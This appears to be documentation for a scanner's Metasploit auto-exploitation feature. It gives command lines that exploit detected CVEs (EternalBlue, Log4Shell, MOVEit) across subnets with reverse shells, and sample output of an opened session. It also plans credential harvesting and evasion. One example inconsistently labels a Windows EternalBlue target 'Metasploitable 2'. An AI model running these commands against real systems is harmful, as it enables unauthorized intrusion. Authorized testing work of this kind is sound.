# Metasploit Integration - NextMap v0.3.2

## 🎯 Overview

NextMap v0.3.2 introduces **automatic exploitation** via Metasploit Framework integration! After detecting CVEs during network scanning, NextMap can now automatically launch Metasploit exploits to verify and exploit vulnerabilities.

## 🚀 Features

### 1. CVE-to-MSF Mapping Database
- **Hardcoded exploit mappings** for common CVEs
- **7 pre-configured exploits** including:
  - CVE-2023-44487 (HTTP/2 Rapid Reset)
  - CVE-2023-20198 (Cisco IOS XE)
  - CVE-2023-22515 (Atlassian Confluence)
  - CVE-2023-34362 (MOVEit Transfer SQLi)
  - CVE-2017-0144 (EternalBlue/MS17-010)
  - CVE-2019-0708 (BlueKeep RDP)
  - CVE-2021-44228 (Log4Shell)

### 2. Auto-Exploitation Engine
- **Automatic exploit selection** based on detected CVEs
- **Reverse shell setup** with configurable LHOST/LPORT
- **Session management** - tracks opened Meterpreter sessions
- **Dry-run mode** - preview exploits without executing

### 3. Metasploit Client Integration
- **Auto-detection** of msfconsole installation
- **Resource script execution** for batch exploitation
- **Session tracking** - parse Metasploit output for session IDs
- **Auxiliary module support** for vulnerability scanning

---

## 📖 Usage Examples

### Basic CVE Scan + Auto-Exploitation

```bash
# Scan + Auto-exploit with dry-run (safe mode)
nextmap --target 192.168.1.0/24 -p top1000 -s --cve-scan --msf-exploit --msf-dry-run --msf-lhost 192.168.1.100

# Real exploitation (BE CAREFUL!)
nextmap --target 192.168.1.50 -p 22,80,443,3389 -s --cve-scan --msf-exploit --msf-lhost 192.168.1.100 --msf-lport 4444
```

### Full Workflow Example

```bash
# 1. Comprehensive scan with CVE detection
nextmap --target 10.0.0.0/24 -p top5000 -s -O --cve-scan -f scan_results.json

# 2. Review vulnerabilities
cat scan_results.json | jq '.hosts[].vulnerabilities'

# 3. Auto-exploit with Metasploit (dry-run first!)
nextmap --target 10.0.0.0/24 -p top5000 -s --cve-scan --msf-exploit --msf-dry-run --msf-lhost 10.0.0.100

# 4. Execute real exploitation (after approval)
nextmap --target 10.0.0.50 -p 445 -s --cve-scan --msf-exploit --msf-lhost 10.0.0.100
```

### Custom Metasploit Path

```bash
# Windows custom path
nextmap --target 192.168.1.1 -s --cve-scan --msf-exploit --msf-path "C:\metasploit-framework\bin\msfconsole.bat" --msf-lhost 192.168.1.100

# Linux custom path
nextmap --target 192.168.1.1 -s --cve-scan --msf-exploit --msf-path "/opt/metasploit/msfconsole" --msf-lhost 192.168.1.100
```

---

## 🔧 CLI Options

### Metasploit-Specific Flags

| Option | Description | Default | Required |
|--------|-------------|---------|----------|
| `--msf-exploit` | Enable Metasploit auto-exploitation | `false` | No |
| `--msf-lhost` | Your IP address for reverse shells | Auto-detect | Recommended |
| `--msf-lport` | Port for reverse shells | `4444` | No |
| `--msf-dry-run` | Preview exploits without executing | `false` | No |
| `--msf-path` | Custom msfconsole path | Auto-detect | No |

### Required Flags for Exploitation

```bash
--cve-scan         # CVE detection MUST be enabled
--msf-exploit      # Enable exploitation
--msf-lhost <IP>   # Your listener IP (auto-detected if omitted)
```

---

## 🛠️ Installation Requirements

### 1. Install Metasploit Framework

**Windows:**
```powershell
# Download from https://www.metasploit.com/download
# Or use Chocolatey
choco install metasploit
```

**Linux:**
```bash
# Kali Linux (pre-installed)
msfconsole --version

# Ubuntu/Debian
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
chmod 755 msfinstall
./msfinstall
```

**macOS:**
```bash
# Using Homebrew
brew install metasploit
```

### 2. Verify Installation

```bash
# Test msfconsole
msfconsole -v

# Expected output:
# Framework Version: 6.x.x
```

### 3. Configure NextMap

```bash
# NextMap will auto-detect msfconsole
# If detection fails, specify path manually:
nextmap --msf-path "/custom/path/to/msfconsole" --msf-exploit ...
```

---

## 📊 Output Example

```
🎯 METASPLOIT AUTO-EXPLOITATION
══════════════════════════════════════════════════

✅ Metasploit Framework initialized
📍 LHOST: 192.168.1.100 | LPORT: 4444

🎯 Processing host: 192.168.1.50
  🔍 Found CVE-2017-0144 (Critical) on port 445
    🎯 Launching Metasploit exploit: MS17-010 EternalBlue SMB RCE
       Module: exploit/windows/smb/ms17_010_eternalblue
       Target: 192.168.1.50:445
    ✅ Exploit successful! Session ID: 1

📊 EXPLOITATION SUMMARY
══════════════════════════════════════════════════
Total exploits attempted: 1
✅ Successful: 1
❌ Failed: 0

🎉 Active Sessions:
  Session 1: 192.168.1.50:445 (exploit/windows/smb/ms17_010_eternalblue)

💡 To interact with sessions:
   msfconsole -q -x "sessions -i 1"
```

---

## 🔐 Security & Ethics

### ⚠️ CRITICAL WARNING

**Metasploit auto-exploitation is DANGEROUS and ILLEGAL if used without authorization!**

### Legal Use Cases (Authorization Required)

✅ **Penetration Testing** - With signed contract & written permission  
✅ **Security Audits** - Internal security assessments with approval  
✅ **Red Team Exercises** - Authorized adversary simulation  
✅ **CTF Challenges** - Capture-the-Flag competitions  
✅ **Bug Bounty Programs** - Within scope and rules  
✅ **Own Infrastructure** - Testing your own systems  

### Illegal Use Cases

❌ **Unauthorized scanning** - Networks you don't own or have permission to test  
❌ **Exploiting without consent** - ANY system without explicit authorization  
❌ **Malicious attacks** - Criminal activity (can result in federal prosecution)  
❌ **Testing production systems** - Without proper change management approval  

### Best Practices

1. **ALWAYS use --msf-dry-run first** to preview what would be exploited
2. **Get written authorization** before any real exploitation
3. **Limit scope** - Only exploit specific targets with approval
4. **Document everything** - Keep detailed logs of all actions
5. **Have incident response ready** - In case something goes wrong
6. **Never exploit in production** - Use isolated test environments
7. **Inform stakeholders** - Before and after exploitation activities

### Disclaimer

```
This tool is provided for educational and authorized security testing purposes only.
The authors and contributors are NOT responsible for misuse or damage caused by
this software. Using NextMap Metasploit integration to exploit systems without
explicit authorization is ILLEGAL and may result in criminal prosecution.

Always obtain written permission before conducting security assessments.
```

---

## 🏗️ Architecture

### Workflow Diagram

```
┌─────────────────────────────────────────────────────────────┐
│                      NextMap v0.3.2                         │
│                  Metasploit Integration                     │
└─────────────────────────────────────────────────────────────┘
                            │
                            ▼
          ┌─────────────────────────────────┐
          │   1. Network Scanning (TCP/UDP)  │
          │      - Port detection            │
          │      - Service fingerprinting    │
          └─────────────────────────────────┘
                            │
                            ▼
          ┌─────────────────────────────────┐
          │   2. CVE Detection               │
          │      - Service→CVE matching      │
          │      - CVSS scoring              │
          │      - Version validation        │
          └─────────────────────────────────┘
                            │
                            ▼
          ┌─────────────────────────────────┐
          │   3. CVE→MSF Mapping             │
          │      - Exploit database lookup   │
          │      - Module selection          │
          │      - Target validation         │
          └─────────────────────────────────┘
                            │
                            ▼
          ┌─────────────────────────────────┐
          │   4. Metasploit Execution        │
          │      - Resource script creation  │
          │      - Auto-configuration        │
          │      - LHOST/LPORT setup         │
          │      - Payload selection         │
          └─────────────────────────────────┘
                            │
                            ▼
          ┌─────────────────────────────────┐
          │   5. Session Management          │
          │      - Session ID extraction     │
          │      - Active session tracking   │
          │      - Result reporting          │
          └─────────────────────────────────┘
```

### Code Structure

```
src/
├── msf.rs                    # NEW - Metasploit integration
│   ├── MetasploitClient      # Main client struct
│   ├── MetasploitExploit     # Exploit metadata
│   ├── ExploitResult         # Exploitation results
│   ├── auto_exploit()        # Auto-exploitation engine
│   └── exploit_database      # CVE→MSF mapping
├── cve.rs                    # CVE detection (existing)
├── main.rs                   # CLI integration (modified)
└── models.rs                 # Data structures (existing)
```

---

## 🧪 Testing

### 1. Dry-Run Test (Safe)

```bash
# Test against intentionally vulnerable target (Metasploitable)
nextmap --target 192.168.1.200 -p top1000 -s --cve-scan --msf-exploit --msf-dry-run --msf-lhost 192.168.1.100
```

**Expected Output:**
```
🔹 DRY-RUN MODE - Exploits will NOT be executed

🎯 Processing host: 192.168.1.200
  🔍 Found CVE-2017-0144 (Critical) on port 445
    🔹 [DRY-RUN] Would exploit with: exploit/windows/smb/ms17_010_eternalblue
```

### 2. Real Exploitation Test (Controlled Environment)

```bash
# Against Metasploitable VM (intentionally vulnerable)
nextmap --target 192.168.1.200 -p 445 -s --cve-scan --msf-exploit --msf-lhost 192.168.1.100
```

### 3. Test Scenarios

| Scenario | Target | CVE | Expected Result |
|----------|--------|-----|----------------|
| Windows 7 (Unpatched) | Port 445 | CVE-2017-0144 | ✅ Session opened |
| Atlassian Confluence 8.0 | Port 80 | CVE-2023-22515 | ✅ Privilege escalation |
| Linux (Apache Log4j) | Port 8080 | CVE-2021-44228 | ✅ RCE shell |
| Updated Windows 10 | Port 445 | CVE-2017-0144 | ❌ Exploit fails (patched) |

---

## 🔮 Future Enhancements

### Planned for v0.4.0

1. **Custom Exploit Loader**
   - Load exploits from JSON file
   - Community-contributed mappings
   - Dynamic MSF module search

2. **Advanced Payload Selection**
   - OS-specific payloads
   - Staged vs. stageless
   - Encoder selection (evasion)

3. **Post-Exploitation Automation**
   - Automatic privilege escalation
   - Credential harvesting
   - Lateral movement

4. **Reporting Enhancements**
   - Exploitation timeline
   - Session interaction logs
   - Proof-of-concept screenshots

5. **Integration with Other Tools**
   - Nmap NSE script results
   - Nessus vulnerability data
   - OpenVAS integration

---

## 📚 CVE→MSF Database

### Currently Supported Exploits

| CVE ID | Module Path | Rank | Service | Platforms |
|--------|-------------|------|---------|-----------|
| CVE-2023-44487 | auxiliary/dos/http/http2_rst_stream | Normal | nginx, apache | Multi |
| CVE-2023-20198 | exploit/multi/http/cisco_ios_xe_webui_privesc | Excellent | Cisco IOS XE | Multi |
| CVE-2023-22515 | exploit/linux/http/atlassian_confluence_auth_bypass | Excellent | Confluence | Linux |
| CVE-2023-34362 | exploit/windows/http/progress_moveit_sqli_rce | Excellent | MOVEit | Windows |
| CVE-2017-0144 | exploit/windows/smb/ms17_010_eternalblue | Excellent | SMB | Windows |
| CVE-2019-0708 | exploit/windows/rdp/cve_2019_0708_bluekeep_rce | Manual | RDP | Windows |
| CVE-2021-44228 | exploit/multi/http/log4shell_header_injection | Excellent | Log4j | Multi |

### Adding New Exploits

Edit `src/msf.rs`, function `load_exploit_mappings()`:

```rust
self.exploit_database.insert(
    "CVE-YYYY-XXXXX".to_string(),
    vec![
        MetasploitExploit {
            module_path: "exploit/path/to/module".to_string(),
            name: "Exploit Name".to_string(),
            rank: "Excellent".to_string(),  // Excellent, Great, Good, Normal, Average, Low, Manual
            cve_ids: vec!["CVE-YYYY-XXXXX".to_string()],
            targets: vec!["Target Software".to_string()],
            required_options: vec!["RHOSTS".to_string(), "RPORT".to_string()],
        }
    ]
);
```

---

## 🐛 Troubleshooting

### Error: "Metasploit Framework not found"

**Cause:** msfconsole not in PATH or not installed

**Solution:**
```bash
# 1. Verify installation
msfconsole -v

# 2. If not found, specify path manually
nextmap --msf-path "/opt/metasploit/msfconsole" ...

# 3. Or add to PATH (Linux/macOS)
export PATH=$PATH:/opt/metasploit/bin

# Windows
setx PATH "%PATH%;C:\metasploit-framework\bin"
```

### Error: "LHOST not specified and could not auto-detect"

**Cause:** Unable to determine local IP for reverse shell

**Solution:**
```bash
# Manually specify LHOST
nextmap --msf-exploit --msf-lhost <YOUR_IP> ...

# Check your IP first
ip addr show         # Linux
ipconfig             # Windows
ifconfig             # macOS
```

### Warning: "No Metasploit exploit available"

**Cause:** CVE found but no exploit in database

**Solution:**
- Check if exploit exists in Metasploit: `msfconsole -x "search cve:2023-xxxxx"`
- Add mapping manually in `src/msf.rs`
- Report missing exploits via GitHub Issues

### Exploit Fails: "Target appears to be patched"

**Cause:** System has security updates applied

**Solution:**
- This is EXPECTED behavior on patched systems
- Try different exploits if available
- Manual exploitation may be required
- Verify target version matches exploit requirements

---

## 📝 Example Session

```bash
# Full workflow with Metasploitable 2
$ nextmap --target 192.168.1.200 -p top1000 -s --cve-scan --msf-exploit --msf-lhost 192.168.1.100

 ███╗   ██╗███████╗██╗  ██╗████████╗███╗   ███╗ █████╗ ██████╗ 
 ████╗  ██║██╔════╝╚██╗██╔╝╚══██╔══╝████╗ ████║██╔══██╗██╔══██╗
 ██╔██╗ ██║█████╗   ╚███╔╝    ██║   ██╔████╔██║███████║██████╔╝
 ██║╚██╗██║██╔══╝   ██╔██╗    ██║   ██║╚██╔╝██║██╔══██║██╔═══╝ 
 ██║ ╚████║███████╗██╔╝ ██╗   ██║   ██║ ╚═╝ ██║██║  ██║██║     
 ╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝   ╚═╝   ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝     

    🔍 Next Generation Network Scanner v0.3.2
    Advanced Stealth • CVE Detection • Auto-Exploitation

🛡️ Initializing CVE database...
📊 CVE Database: 5 total vulnerabilities
🚀 Starting NextMap scan...
🛡️ CVE scanning: ENABLED
📍 Targets: 1 hosts
🔍 TCP Ports: 1000 (top 1000 common ports - nmap compatible)

[████████████████████] 1000/1000 ports scanned

✅ Scan completed!

🎯 METASPLOIT AUTO-EXPLOITATION
══════════════════════════════════════════════════

✅ Metasploit Framework detected: 6.3.25
✅ Metasploit Framework initialized
📍 LHOST: 192.168.1.100 | LPORT: 4444

🎯 Processing host: 192.168.1.200
  🔍 Found CVE-2017-0144 (Critical) on port 445
    🎯 Launching Metasploit exploit: MS17-010 EternalBlue SMB RCE
       Module: exploit/windows/smb/ms17_010_eternalblue
       Target: 192.168.1.200:445
    ✅ Exploit successful! Session ID: 1

📊 EXPLOITATION SUMMARY
══════════════════════════════════════════════════
Total exploits attempted: 1
✅ Successful: 1
❌ Failed: 0

🎉 Active Sessions:
  Session 1: 192.168.1.200:445 (exploit/windows/smb/ms17_010_eternalblue)

💡 To interact with sessions:
   msfconsole -q -x "sessions -i 1"
```

---

## 📄 License

MIT License - See LICENSE file for details

## 👥 Contributors

- NextMap Dev Team
- Community Contributors

## 🔗 Links

- **GitHub**: https://github.com/pozivo/nextmap
- **Documentation**: https://github.com/pozivo/nextmap#metasploit-integration
- **Metasploit**: https://www.metasploit.com/
- **Report Issues**: https://github.com/pozivo/nextmap/issues

---

**⚠️ USE RESPONSIBLY - AUTHORIZATION REQUIRED FOR ALL EXPLOITATION ACTIVITIES**
